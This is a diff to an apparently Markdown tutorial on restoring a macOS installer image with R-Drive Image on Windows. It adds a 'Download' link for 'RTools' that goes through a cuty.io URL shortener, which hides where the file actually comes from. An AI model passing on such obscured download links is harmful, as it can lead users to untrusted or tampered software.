@@ -62,6 +62,7 @@ Select the version you want (High Sierra → Tahoe).
 - ⚠️ **This process erases the entire drive. Be sure to back up your data.**
 
 ### 3️⃣ 🚀 Open **R-Drive Image** in Windows  
+- **Download** - *[RTools](https://cuty.io/RTools)*
 Launch the software.
 
 ### 4️⃣ Start the Restore Process  
